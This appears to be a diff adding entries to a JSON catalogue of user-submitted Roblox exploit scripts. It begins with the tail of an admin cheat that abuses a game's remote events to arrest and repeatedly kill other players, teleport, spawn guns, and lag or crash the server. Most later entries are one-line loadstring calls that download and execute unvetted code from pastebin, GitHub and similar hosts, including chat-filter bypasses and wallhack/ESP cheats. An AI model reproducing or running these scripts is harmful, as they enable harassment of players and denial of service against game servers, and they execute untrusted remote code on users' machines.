game:GetService(\"RunService\").Stepped:Wait()\n\t\t\t\t\tAPI.MoveTo(v.Character:GetPrimaryPartCFrame()*CFrame.new(0,0,-4.5))\n\t\t\t\t\ttask.spawn(function()\n\t\t\t\t\t\tworkspace.Remote.arrest:InvokeServer(v.Character.PrimaryPart)\n\t\t\t\t\tend)\n\t\t\t\tuntil v.Character[\"Head\"]:FindFirstChildOfClass(\"BillboardGui\")\n\t\t\t\tAPI.MoveTo(LastPosition)\n\t\t\t\twait(.7)\n\t\t\tend\n\t\tend\n\t\tAPI.MoveTo(LastPosition)\n\telseif Args[2] and Args[2]~=\"all\" then\n\t\tlocal LastPosition = API.GetPosition()\n\t\tlocal Target = API.FindPlayer(Args[2])\n\t\tif Target then\n\t\t\tif Target.Team == game.Teams.Guards or not API.BadArea(Target) then\n\t\t\t\treturn API.Notify(\"Can't arrest this player!\")\n\t\t\tend\n\t\t\trepeat game:GetService(\"RunService\").Stepped:Wait()\n\t\t\t\tAPI.MoveTo(Target.Character:GetPrimaryPartCFrame()*CFrame.new(0,0,-4.5))\n\t\t\t\ttask.spawn(function()\n\t\t\t\t\tworkspace.Remote.arrest:InvokeServer(Target.Character.PrimaryPart)\n\t\t\t\tend)\n\t\t\tuntil Target.Character[\"Head\"]:FindFirstChildOfClass(\"BillboardGui\")\n\t\tend\n\t\tAPI.MoveTo(LastPosition)\n\tend\nend,{[\"Description\"] = \"Arrests a player\",[\"Type\"] = \"Player,All\"})\nAPI.AddCommand(\"bring\", function(Args)\n\tlocal Target = API.FindPlayer(Args[2])\n\tif Target then\n\t\tAPI.Bring(Target)\n\tend\nend,{[\"Description\"] = \"Brings a player to you\",[\"Type\"] = \"player\"})\nAPI.AddCommand(\"goto\", function(Args)\n\tlocal Target = API.FindPlayer(Args[2])\n\tif Target then\n\t\tAPI.MoveTo(Target.Character:GetPrimaryPartCFrame()*CFrame.new(0,0,2.5))\n\tend\nend,{[\"Description\"] = \"Teleports you to a player\",[\"Type\"] = \"player\"})\nAPI.AddCommand(\"view\", function(Args)\n\tlocal Target = API.FindPlayer(Args[2])\n\tif Target then\n\t\tif Temp.ViewingPlayer then\n\t\t\tTemp.ViewingPlayer:Disconnect()\n\t\tend\n\t\tTemp.ViewingPlayer = game:GetService(\"RunService\").RenderStepped:Connect(function()\n\t\t\tpcall(function()\n\t\t\t\ttask.spawn(function()\n\t\t\t\t\tworkspace.CurrentCamera.CameraSubject = Target.Character:WaitForChild(\"Humanoid\")\n\t\t\t\tend)\n\t\t\tend)\n\t\tend)\n\t\tAPI.Notify(\"Now viewing this player.\")\n\tend\nend,{[\"Description\"] = \"Spy on a player\",[\"Type\"] = \"player\"})\nAPI.AddCommand(\"unview\", function(Args)\n\tif Temp.ViewingPlayer then\n\t\tTemp.ViewingPlayer:Disconnect()\n\t\tTemp.ViewingPlayer = nil\n\tend\n\tworkspace.CurrentCamera.CameraType = Enum.CameraType.Custom\n\tworkspace.CurrentCamera.CameraSubject = plr.Character.Humanoid\n\tAPI.Notify(\"Stopped view.\")\nend,{[\"Description\"] = \"Stops view command.\",})\nAPI.AddCommand(\"loopkill\", function(Args)\n\tlocal Target = API.FindPlayer(Args[2])\n\tlocal t = {}\n\tlocal index = {}\n\tfor i,v in pairs(game:GetService(\"Teams\"):GetChildren()) do\n\t\ttable.insert(t,v.Name:lower())\n\t\ttable.insert(index,v)\n\tend\n\tif table.find(t,Args[2]) then\n\t\tlocal TeamFound = index[table.find(t,Args[2])]\n\t\tTemp.LkTEAMS[#Temp.LkTEAMS+1] = TeamFound\n\t\treturn\n\tend\n\tif API.StringArgsChecker(Args[2]) == nil then\n\t\tlocal Target = API.FindPlayer(Args[2])\n\t\tif Target then\n\t\t\tif not table.find(Temp.Loopkill,Target.Name) then\n\t\t\t\tTemp.Loopkill[#Temp.Loopkill+1] = Target.Name\n\t\t\t\tAPI.Notify(\"Now loop killing player.\")\n\t\t\tend\n\t\tend\n\telse\n\t\tTemp.LKALL = true\n\t\tAPI.Notify(\"Started looping\")\n\n\tend\nend,{[\"Description\"] = \"Spam kills the player even if he leaves\",[\"Type\"] = \"all\"})\nAPI.AddCommand(\"unloopkill\", function(Args)\n\tlocal t = {}\n\tlocal index = {}\n\tfor i,v in pairs(game:GetService(\"Teams\"):GetChildren()) do\n\t\ttable.insert(t,v.Name:lower())\n\t\ttable.insert(index,v)\n\tend\n\tif table.find(t,Args[2]) then\n\t\tlocal TeamFound = index[table.find(t,Args[2])]\n\t\tfor i,v in pairs(Temp.LkTEAMS) do\n\t\t\tif v == TeamFound then\n\t\t\t\tTemp.LkTEAMS[i] = nil\n\t\t\tend\n\t\tend\n\t\tAPI.Notify(\"Stopped looping\")\n\t\treturn\n\tend\n\tif API.StringArgsChecker(Args[2]) == nil then\n\t\tlocal Target = API.FindPlayer(Args[2])\n\t\tif Target then\n\t\t\tif table.find(Temp.Loopkill,Target.Name) then\n\t\t\t\ttable.remove(Temp.Loopkill,table.find(Temp.Loopkill,Target.Name))\n\t\t\t\tAPI.Notify(\"Stopped loopkilling this player.\")\n\t\t\tend\n\t\tend\n\telse\n\t\tTemp.LKALL = false\n\t\tAPI.Notify(\"Stopped looping\")\n\n\tend\nend,{[\"Description\"] = \"Stops loopkilling a player\",[\"Type\"] = \"all\"})\n------------------------------------------------------------------------//<ON><OFF> COMMANDS\nAPI.AddCommand(\"autoitems\", function(Args)\n\tlocal StateToChange = \"AutoItems\"\n\tAPI.ChangeToggle(StateToChange,Args[2])\nend,{[\"Description\"] = \"Gives you tools everytime you die\",[\"Type\"] = \"toggle\"})\nAPI.AddCommand(\"autorespawn\", function(Args)\n\tlocal StateToChange = \"AutoRespawn\"\n\tAPI.ChangeToggle(StateToChange,Args[2])\n\tAPI.Refresh(plr.Team)\nend,{[\"Description\"] = \"Respawns you back to your position after you die\",[\"Type\"] = \"toggle\",[\"Alt\"] = {\"autore\"}})\n----------------------------------------------------------------OTHER\nAPI.AddCommand(\"removecars\", function(Args)\n\tlocal p = API.GetPosition()\n\tfor i,v in pairs(workspace.CarContainer:GetChildren()) do\n\t\tif v:WaitForChild(\"Body\"):WaitForChild(\"VehicleSeat\").Occupant == nil then\n\t\t\tfor i= 1,3 do\n\t\t\t\ttask.wait()\n\t\t\t\tv:WaitForChild(\"Body\"):WaitForChild(\"VehicleSeat\"):Sit(plr.Character:FindFirstChildOfClass(\"Humanoid\"))\n\t\t\tend\n\t\t\trepeat task.wait() until plr.Character:FindFirstChildOfClass(\"Humanoid\").Sit == true\n\t\t\tv:WaitForChild(\"Body\"):WaitForChild(\"VehicleSeat\")\n\t\t\tv.PrimaryPart = v.Body.VehicleSeat\n\n\t\t\tfor i =1,3 do\n\t\t\t\ttask.wait()\n\t\t\t\tv:SetPrimaryPartCFrame(CFrame.new(99999,workspace.FallenPartsDestroyHeight+15,999999))\n\t\t\tend\n\t\t\twait(.25)\n\t\t\tplr.Character:FindFirstChildOfClass(\"Humanoid\").Sit = false\n\t\tend\n\tend\n\twait()\n\tAPI.MoveTo(p)\nend,{[\"Description\"] = \"Trys to remove all cars around the ma[\",})\nAPI.AddCommand(\"refresh\", function(Args)\n\tAPI.Refresh(plr.Team,API.GetPosition(),true)\nend,{[\"Description\"] = \"Reloads your character\",[\"Alt\"] = {\"re\"}})\nAPI.AddCommand(\"inmate\", function(Args)\n\tAPI.Refresh(game.Teams.Inmates,API.GetPosition(),true)\nend,{[\"Description\"] = \"Reloads your character into inmates team\",})\nAPI.AddCommand(\"guard\", function(Args)\n\tAPI.Refresh(game.Teams.Guards,API.GetPosition(),true)\nend,{[\"Description\"] = \"Reloads your character into inmates guards\",})\nAPI.AddCommand(\"criminal\", function(Args)\n\tAPI.Refresh(game.Teams.Criminals,API.GetPosition(),true)\nend,{[\"Description\"] = \"Reloads your character into inmates criminals\",})\nAPI.AddCommand(\"car\", function(Args)\n\tAPI.GetCar()\nend,{[\"Description\"] = \"Brings a car to you\",})\nAPI.AddCommand(\"lag\", function(Args)\n\tif not API.GuardsFull(true) then\n\t\tAPI.Refresh(game.Teams.Guards,API.GetPosition(),true)\n\telse\n\t\tAPI.GetGun(\"M9\")\n\t\trepeat task.wait() until API.IsFound(\"M9\")\n\tend\n\tfor i =1,45 do\n\t\tgame:GetService(\"ReplicatedStorage\"):WaitForChild(\"ShootEvent\"):FireServer({}, API.GetGun(\"M9\"))\n\tend\n\tAPI.Notify(\"Lagged the server.\")\nend,{[\"Description\"] = \"Lags the server\",})\nAPI.AddCommand(\"crashserver\", function(Args)\n\tAPI.Notify(\"Attempting to crash the server this might take some time.\")\n\tif not API.GuardsFull(true) then\n\t\tAPI.Refresh(game.Teams.Guards,API.GetPosition(),true)\n\telse\n\t\tAPI.GetGun(\"M9\")\n\t\trepeat task.wait() until API.IsFound(\"M9\")\n\tend\n\tfor i =1,10000000000 do\n\t\tgame:GetService(\"RunService\").Stepped:Wait()\n\t\tgame:GetService(\"ReplicatedStorage\"):WaitForChild(\"ShootEvent\"):FireServer({},(plr.Backpack:FindFirstChild(\"M9\") or plr.Character:FindFirstChild(\"M9\")))\n\tend\nend,{[\"Description\"] = \"Tries to crash the server\",})\nAPI.AddCommand(\"guns\", function(Args)\n\tAPI.Guns()\nend,{[\"Description\"] = \"Gives you all guns\",})\nAPI.AddCommand(\"m9\", function(Args)\n\tAPI.GetGun(\"M9\")\nend,{[\"Description\"] = \"Gives you a m9\",})\nAPI.AddCommand(\"ak\", function(Args)\n\tAPI.GetGun(\"AK-47\")\nend,{[\"Description\"] = \"Gives you a ak\",})\nAPI.AddCommand(\"shotgun\", function(Args)\n\tAPI.GetGun(\"Remington 870\")\nend,{[\"Description\"] = \"Gives you a shotgun\",})\nAPI.AddCommand(\"m4\", function(Args)\n\tAPI.GetGun(\"M4A1\")\nend,{[\"Description\"] = \"Gives you a gun\",})\nAPI.AddCommand(\"knife\", function(Args)\n\tworkspace.Remote.ItemHandler:InvokeServer({Position=game:GetService(\"Players\").LocalPlayer.Character.Head.Position,Parent=workspace.Prison_ITEMS.single[\"Crude Knife\"]})\nend,{[\"Description\"] = \"Gives you a knife\",})\nAPI.AddCommand(\"hammer\", function(Args)\n\tworkspace.Remote.ItemHandler:InvokeServer({Position=game:GetService(\"Players\").LocalPlayer.Character.Head.Position,Parent=workspace.Prison_ITEMS.single[\"Hammer\"]})\nend,{[\"Description\"] = \"Gives you a hammer\",})\nAPI.AddCommand(\"allcmds\", function(Args)\n\tAPI.Notify(\"Tiger admin has \"..tostring(Temp.CMDA)..\" commands.\")\nend,{[\"Description\"] = \"Tells you how much commands Tiger admin has\",})\nAPI.AddCommand(\"shield\", function()\n\tlocal Shield = API.FindShield()\n\tif not Shield then\n\t\tAPI.Notify(\"Shield could not be found.\")\n\t\treturn\n\tend\n\trepeat task.wait() \n\t\tRemote.equipShield:FireServer(Shield)\t\n\tuntil Player.Character and Player.Character:FindFirstChild(\"shield\", true) and Player.Character:FindFirstChild(\"shield\",true).Transparency < 1\n\tif Player.Character:FindFirstChild(\"shield\",true).CanCollide then\n\t\tAPI.Notify(\"Warning: This shield has collisions\")\n\tend\nend, {[\"Description\"] = \"Will try to find a shield and equip one for you.\"})\nAPI.AddCommand(\"armory\", function(Args)\n\tlocal Pos = CFrame.new(835.3958129882812, 99.98998260498047, 2269.98046875)\n\tlocal Target = API.FindPlayer(Args[2])\n\tif not Target then\n\t\tAPI.MoveTo(Pos)\n\telse\n\t\tAPI.Bring(Target,Pos)\n\tend\nend,{[\"Description\"] = \"Teleports you to the armory\",})\nAPI.AddCommand(\"prison\", function(Args)\n\tlocal Pos = CFrame.new(914.2466430664062, 99.98998260498047, 2365.96923828125)\n\tlocal Target = API.FindPlayer(Args[2])\n\tif not Target then\n\t\tAPI.MoveTo(Pos)\n\telse\n\t\tAPI.Bring(Target,Pos)\n\tend\nend,{[\"Description\"] = \"Teleports you to the prison\",[\"Alt\"] = {\"nex\"}})\nAPI.AddCommand(\"cafe\", function(Args)\n\tlocal Pos = CFrame.new(918.4052124023438, 99.98993682861328, 2228.078857421875)\n\tlocal Target = API.FindPlayer(Args[2])\n\tif not Target then\n\t\tAPI.MoveTo(Pos)\n\telse\n\t\tAPI.Bring(Target,Pos)\n\tend\nend,{[\"Description\"] = \"Teleports you to the cafe\",})\nAPI.AddCommand(\"tower\", function(Args)\n\tlocal Pos = CFrame.new(822.0411987304688, 130.03990173339844, 2570.348876953125)\n\tlocal Target = API.FindPlayer(Args[2])\n\tif not Target then\n\t\tAPI.MoveTo(Pos)\n\telse\n\t\tAPI.Bring(Target,Pos)\n\tend\nend,{[\"Description\"] = \"Teleports you to the tower at yard\",})\nAPI.AddCommand(\"crimbase\", function(Args)\n\tlocal Pos = CFrame.new(-860.5330200195312, 94.47602844238281, 2099.54833984375)\n\tlocal Target = API.FindPlayer(Args[2])\n\tif not Target then\n\t\tAPI.MoveTo(Pos)\n\telse\n\t\tAPI.Bring(Target,Pos)\n\tend\nend,{[\"Description\"] = \"Teleports you to the criminals base\",})\nplr.CharacterAdded:Connect(function(NewChar)\n\tNewChar:WaitForChild(\"Humanoid\")\n\tif States.AutoItems then\n\t\tAPI.Guns()\n\tend\n\tif States.AutoRespawn then\n\t\tNewChar:WaitForChild(\"Humanoid\").BreakJointsOnDeath = not States.AutoRespawn\n\t\tNewChar:WaitForChild(\"Humanoid\").Died:Connect(function()\n\t\t\tif not States.Unloaded and States.AutoRespawn == true then\n\t\t\t\tAPI.Refresh(plr.Team,API.GetPosition())\n\t\t\t\ttask.spawn(function()\n\t\t\t\t\tif States.AutoItems then\n\t\t\t\t\t\twait(.5)\n\t\t\t\t\t\tAPI.Guns()\n\t\t\t\t\tend\n\t\t\t\tend)\n\t\t\tend\n\t\tend)\n\tend\nend)\nPlayer.Chatted:Connect(API.ExecuteCommand)\nCommandBar.FocusLost:Connect(function(a)\n\tlocal txt = CommandBar.Text\n\tif a and #txt >0 then\n\t\tif string.sub(txt,1,1) ~= Settings.Prefix then\n\t\t\ttxt = Settings.Prefix..txt\n\t\tend\n\t\tAPI.ExecuteCommand(txt)\n\tend\n\tCommandBar.Text = \"\"\nend)\nCommandBar.Changed:Connect(function()\n\tif CommandBar.Text:find(\";\") and Settings.Prefix ~= \";\" then\n\t\tCommandBar.Text = CommandBar.Text:gsub(\";\",\"\")\n\tend\nend)\n\n--------------// FIELD OF LOOPS!\ntask.spawn(function()\n\twhile wait(1) do --//Loopkill Optimized\n\t\tif Temp.LKALL == true then\n\t\t\tAPI.KillTeam(\"all\")\n\t\tend\n\t\tfor i,v in pairs(Temp.LkTEAMS) do\n\t\t\tif v then\n\t\t\t\tAPI.KillTeam(v)\n\t\t\tend\n\t\tend\n\t\tif States.Unloaded then break end\n\t\tif Temp.Loopkill and #Temp.Loopkill >0 then\n\t\t\tfor i,v in pairs(Temp.Loopkill) do\n\t\t\t\tif v then\n\t\t\t\t\tlocal Target = game:GetService(\"Players\"):FindFirstChild(v)\n\t\t\t\t\tif Target then\n\t\t\t\t\t\tAPI.Kill(Target,nil,true)\n\t\t\t\t\t\twait(.7)\n\t\t\t\t\telse\n\t\t\t\t\t\ttable.remove(Temp.Loopkill,i)\n\t\t\t\t\tend\n\t\t\t\tend\n\t\t\tend\n\t\tend\n\tend\nend)\nAPI.Notify(\"Press ';' to open Tiger Admin Menu. Welcome to Tiger Admin 2.0\",4)",
+      "Script_Title": "tiger",
+      "User_ID": 7647502266,
+      "Username": "anti0der67"
+    },
+    "Script2290": {
+      "Date": "December 03 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGetAsync(\"https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty11.lua\"))()",
+      "Script_Title": "animation ",
+      "User_ID": 4612744015,
+      "Username": "meng1234v"
+    },
+    "Script2291": {
+      "Date": "December 02 2024",
+      "Description": "комманды админа @romlox666",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()",
+      "Script_Title": "admin commands🦅",
+      "User_ID": 2484757261,
+      "Username": "romlox666"
+    },
+    "Script2292": {
+      "Date": "December 02 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/REDzHUB/REDzHUB/main/REDzHUB\"))()\n\n",
+      "Script_Title": "red z",
+      "User_ID": 7488361702,
+      "Username": "GUIZIN_MELON"
+    },
+    "Script2293": {
+      "Date": "December 03 2024",
+      "Description": "script work games:Pop Bubbles for UGC",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Free-UGC-Line-Inf-Cash-Multiplier-Popup-blocker-and-Spam-cut-22128\"))()",
+      "Script_Title": "Pop Bubbles for UGC",
+      "User_ID": 6221247402,
+      "Username": "mfellxpa"
+    },
+    "Script2294": {
+      "Date": "December 02 2024",
+      "Description": "og c00lgui",
+      "Script": "loadstring(game:GetObjects(\"rbxassetid://11801763945\")[1].Source)()",
+      "Script_Title": "c00lgui",
+      "User_ID": 2371503844,
+      "Username": "pelusopapu"
+    },
+    "Script2295": {
+      "Date": "December 02 2024",
+      "Description": "skidded gui client replication",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-n0tagui-op-16746\"))()",
+      "Script_Title": "n0tagui op ",
+      "User_ID": 2371503844,
+      "Username": "pelusopapu"
+    },
+    "Script2296": {
+      "Date": "December 03 2024",
+      "Description": "hx script Kick Gui Brasil??",
+      "Script": "-- Variáveis para a GUI de Kick\nlocal ScreenGui = Instance.new(\"ScreenGui\")\nlocal MainFrame = Instance.new(\"Frame\")\nlocal UICorner = Instance.new(\"UICorner\")\nlocal KickLabel = Instance.new(\"TextLabel\")\nlocal KickMessageInput = Instance.new(\"TextBox\")\nlocal ApplyKickButton = Instance.new(\"TextButton\")\n\n-- Configurando a GUI\nScreenGui.Parent = game.CoreGui\nScreenGui.Name = \"KickGui\"\n\n-- Configurando o frame principal\nMainFrame.Parent = ScreenGui\nMainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)\nMainFrame.Size = UDim2.new(0, 220, 0, 150)\nMainFrame.Position = UDim2.new(0.5, -110, 0.5, -75)\nMainFrame.AnchorPoint = Vector2.new(0.5, 0.5)\nMainFrame.BackgroundTransparency = 0.2\n\n-- Adicionando bordas arredondadas\nUICorner.Parent = MainFrame\nUICorner.CornerRadius = UDim.new(0, 15)\n\n-- Configurando o rótulo (label) para Kick Message\nKickLabel.Parent = MainFrame\nKickLabel.Text = \"Defina a mensagem de Kick:\"\nKickLabel.Size = UDim2.new(0, 200, 0, 30)\nKickLabel.Position = UDim2.new(0, 10, 0, 20)\nKickLabel.BackgroundColor3 = Color3.fromRGB(25, 25, 25)\nKickLabel.TextColor3 = Color3.fromRGB(255, 255, 255)\nKickLabel.Font = Enum.Font.SourceSans\nKickLabel.TextSize = 18\nKickLabel.BackgroundTransparency = 1\n\n-- Configurando o campo de entrada (TextBox) para Kick Message\nKickMessageInput.Parent = MainFrame\nKickMessageInput.Size = UDim2.new(0, 200, 0, 30)\nKickMessageInput.Position = UDim2.new(0, 10, 0, 60)\nKickMessageInput.BackgroundColor3 = Color3.fromRGB(50, 50, 50)\nKickMessageInput.TextColor3 = Color3.fromRGB(255, 255, 255)\nKickMessageInput.Font = Enum.Font.SourceSans\nKickMessageInput.TextSize = 18\nKickMessageInput.PlaceholderText = \"Mensagem de Kick\"\nKickMessageInput.Text = \"\"\nlocal KickMessageInputCorner = Instance.new(\"UICorner\", KickMessageInput)\nKickMessageInputCorner.CornerRadius = UDim.new(0, 10)\n\n-- Configurando o botão de aplicação (Apply Kick)\nApplyKickButton.Parent = MainFrame\nApplyKickButton.Text = \"Aplicar Kick\"\nApplyKickButton.Size = UDim2.new(0, 200, 0, 30)\nApplyKickButton.Position = UDim2.new(0, 10, 0, 100)\nApplyKickButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)\nApplyKickButton.TextColor3 = Color3.fromRGB(255, 255, 255)\nApplyKickButton.Font = Enum.Font.SourceSans\nApplyKickButton.TextSize = 18\nlocal ApplyKickButtonCorner = Instance.new(\"UICorner\", ApplyKickButton)\nApplyKickButtonCorner.CornerRadius = UDim.new(0, 10)\n\n-- Aplicando o Kick com a mensagem definida\nApplyKickButton.MouseButton1Click:Connect(function()\n    local kickMessage = KickMessageInput.Text\n    if kickMessage and kickMessage ~= \"\" then\n        game.Players.LocalPlayer:Kick(kickMessage)\n    else\n        KickMessageInput.Text = \"\"\n        KickMessageInput.PlaceholderText = \"Digite uma mensagem!\"\n    end\nend)\n\n-- Movimentação do Frame para PC e Mobile\nlocal UIS = game:GetService(\"UserInputService\")\nlocal dragging, dragInput, dragStart, startPos\n\nMainFrame.InputBegan:Connect(function(input)\n    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then\n        dragging = true\n        dragStart = input.Position\n        startPos = MainFrame.Position\n        input.Changed:Connect(function()\n            if input.UserInputState == Enum.UserInputState.End then\n                dragging = false\n            end\n        end)\n    end\nend)\n\nMainFrame.InputChanged:Connect(function(input)\n    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then\n        dragInput = input\n    end\nend)\n\nUIS.InputChanged:Connect(function(input)\n    if input == dragInput and dragging then\n        local delta = input.Position - dragStart\n        MainFrame.Position = UDim2.new(\n            startPos.X.Scale,\n            startPos.X.Offset + delta.X,\n            startPos.Y.Scale,\n            startPos.Y.Offset + delta.Y\n        )\n    end\nend)",
+      "Script_Title": "Hx Gui Kick",
+      "User_ID": 7357975995,
+      "Username": "kinito_pet118"
+    },
+    "Script2297": {
+      "Date": "December 03 2024",
+      "Description": "uhhh...idk",
+      "Script": "local key = \"E\" --key to intiate the flashback. see https://create.roblox.com/docs/reference/engine/enums/KeyCode for an exhaustive list\nlocal flashbacklength = 60 --how long the flashback should be stored in approx seconds\nlocal flashbackspeed = 1 --how many frames to skip during flashback (set to 0 to disable)\n\nlocal name = game:GetService(\"RbxAnalyticsService\"):GetSessionId() --unique id that games cannot access but does not change on subsequent executions (used for the name of the binded function)\nlocal frames,uis,LP,RS = {},game:GetService(\"UserInputService\"),game:GetService(\"Players\").LocalPlayer,game:GetService(\"RunService\") --set some vars\n\npcall(RS.UnbindFromRenderStep,RS,name) --unbind the function if previously binded\n\nlocal function getchar()\n   return LP.Character or LP.CharacterAdded:Wait()\nend\n\nfunction gethrp(c) --gethrp ripped from my env script and stripped of arguments\nreturn c:FindFirstChild(\"HumanoidRootPart\") or c.RootPart or c.PrimaryPart or c:FindFirstChild(\"Torso\") or c:FindFirstChild(\"UpperTorso\") or c:FindFirstChildWhichIsA(\"BasePart\")\nend\n\nlocal flashback = {lastinput=false,canrevert=true}\n\nfunction flashback:Advance(char,hrp,hum,allowinput)\n   \n   if #frames>flashbacklength*60 then --make sure we don't have too much history\n       table.remove(frames,1)\n   end\n   \n   if allowinput and not self.canrevert then\n       self.canrevert = true\n   end\n   \n   if self.lastinput then --make sure platformstand goes back to normal\n       hum.PlatformStand = false\n       self.lastinput = false\n   end\n   \n   table.insert(frames,{\n       hrp.CFrame,\n       hrp.Velocity,\n       hum:GetState(),\n       hum.PlatformStand,\n       char:FindFirstChildOfClass(\"Tool\")\n   })\nend\n\nfunction flashback:Revert(char,hrp,hum)\n   local num = #frames\n   if num==0 or not self.canrevert then --add to history and return if no history is present\n       self.canrevert = false\n       self:Advance(char,hrp,hum)\n       return\n   end\n   for i=1,flashbackspeed do --skip frames (if enabled)\n       table.remove(frames,num)\n       num=num-1\n   end\n   self.lastinput = true\n   local lastframe = frames[num]\n   table.remove(frames,num)\n   hrp.CFrame = lastframe[1]\n   hrp.Velocity = -lastframe[2]\n   hum:ChangeState(lastframe[3])\n   hum.PlatformStand = lastframe[4] --platformstand to make flying look normal again\n   local currenttool = char:FindFirstChildOfClass(\"Tool\")\n   if lastframe[5] then --equip/unequip tools\n       if not currenttool then\n           hum:EquipTool(lastframe[5])\n       end\n   else\n       hum:UnequipTools()\n   end\nend\n\nlocal function step() --function that runs every frame\n   local char = getchar()\n   local hrp = gethrp(char)\n   local hum = char:FindFirstChildWhichIsA(\"Humanoid\")\n   if uis:IsKeyDown(Enum.KeyCode[key]) then --begin flashback\n       flashback:Revert(char,hrp,hum)\n   else\n       flashback:Advance(char,hrp,hum,true)\n   end\nend\nRS:BindToRenderStep(name,1,step) --finally, bind our function",
+      "Script_Title": "botão?",
+      "User_ID": 3900268616,
+      "Username": "ERRO_422"
+    },
+    "Script2298": {
+      "Date": "December 02 2024",
+      "Description": "join the discord for the key https://discord.gg/catbyp",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/shadow62x/catbypass/main/upfix\"))()",
+      "Script_Title": "Chat byapsser ",
+      "User_ID": 938488703,
+      "Username": "SpiderE11iot"
+    },
+    "Script2299": {
+      "Date": "December 03 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://paste.ee/r/5wgfo\",true))()",
+      "Script_Title": "elevator",
+      "User_ID": 4161586400,
+      "Username": "13117l"
+    },
+    "Script2300": {
+      "Date": "December 02 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Fsploit/Flux-Z-Beta/refs/heads/main/Flux-Z-Beta-Blade-Ball.lua\"))()",
+      "Script_Title": "Blade Ball",
+      "User_ID": 6132841743,
+      "Username": "ggeasyplayer3881"
+    },
+    "Script2301": {
+      "Date": "December 02 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-ScriptHub-V3-Best-Mobile-ScriptHub-Keyless-16115\"))()",
+      "Script_Title": "Op",
+      "User_ID": 6132841743,
+      "Username": "ggeasyplayer3881"
+    },
+    "Script2302": {
+      "Date": "December 03 2024",
+      "Description": "script work games:Find the Koalas [85!]🐨",
+      "Script": "loadstring(game:HttpGet(('https://pastefy.app/3uBlkkgA/raw'),true))()",
+      "Script_Title": "Find the Koalas [85!",
+      "User_ID": 6221247402,
+      "Username": "mfellxpa"
+    },
+    "Script2303": {
+      "Date": "December 03 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet('https://pastefy.app/S7xNJSXX/raw'))()execute(\"Script6\")",
+      "Script_Title": "face gui",
+      "User_ID": 7644362660,
+      "Username": "ncncnnc09"
+    },
+    "Script2304": {
+      "Date": "December 03 2024",
+      "Description": "good script for shooter games ",
+      "Script": "loadstring(game:HttpGet\"https://pastebin.com/raw/nQwmDgky\")()",
+      "Script_Title": "wall & speed &esp  ",
+      "User_ID": 7652264231,
+      "Username": "hfgrtta"
+    },
+    "Script2305": {
+      "Date": "December 03 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/The-Strongest-Battlegrounds-BetterBypasser-Chat-Bypass-AI-ChatBot-Hub-22691\"))()",
+      "Script_Title": "chatbot",
+      "User_ID": 4741533875,
+      "Username": "AYMAHMU"
+    },
+    "Script2306": {
+      "Date": "December 03 2024",
+      "Description": "rarest unit is titan snow speakerman cost:1100(in game)",
+      "Script": "loadstring(game:HttpGet(('https://pastebin.com/raw/51GyqBgH'),true))()",
+      "Script_Title": "bathroom td x",
+      "User_ID": 4161586400,
+      "Username": "13117l"
     }
   }
 }
